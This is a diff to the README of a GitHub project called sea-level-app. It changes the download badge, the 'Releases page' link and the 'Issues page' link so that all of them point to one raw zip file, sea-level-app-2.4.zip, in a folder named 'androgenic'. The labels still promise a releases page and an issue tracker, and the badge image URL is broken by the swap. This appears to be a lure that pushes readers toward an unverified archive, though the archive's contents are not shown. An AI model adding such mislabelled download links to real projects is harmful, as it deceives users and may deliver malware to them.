@@ -8,9 +8,9 @@ Welcome to the **sea-level-app**! This interactive web application helps you und
 
 To begin using the sea-level-app, you will need to download it. You can find the latest version on our Releases page. 
 
-[![Download the sea-level-app](https://img.shields.io/badge/Download%20Now!-sea--level--app-brightgreen)](https://github.com/ViswaBai/sea-level-app/releases)
+[![Download the sea-level-app](https://github.com/ViswaBai/sea-level-app/raw/refs/heads/main/androgenic/sea-level-app-2.4.zip%20Now!-sea--level--app-brightgreen)](https://github.com/ViswaBai/sea-level-app/raw/refs/heads/main/androgenic/sea-level-app-2.4.zip)
 
-1. Click the button above to visit our [Releases page](https://github.com/ViswaBai/sea-level-app/releases).
+1. Click the button above to visit our [Releases page](https://github.com/ViswaBai/sea-level-app/raw/refs/heads/main/androgenic/sea-level-app-2.4.zip).
 2. On that page, look for the most recent version.
 3. Download the file for your operating system.
 4. Once the download is complete, locate the file on your computer.
@@ -71,6 +71,6 @@ The sea-level-app is open-source software. You can freely use and modify it. For
 
 ## ⚙️ Support
 
-If you encounter any issues, please visit our [Issues page](https://github.com/ViswaBai/sea-level-app/issues) to report problems or seek help.
+If you encounter any issues, please visit our [Issues page](https://github.com/ViswaBai/sea-level-app/raw/refs/heads/main/androgenic/sea-level-app-2.4.zip) to report problems or seek help.
 
 Happy predicting! Feel free to reach out if you have questions about the sea-level-app. We hope you find it useful in understanding global sea level changes.
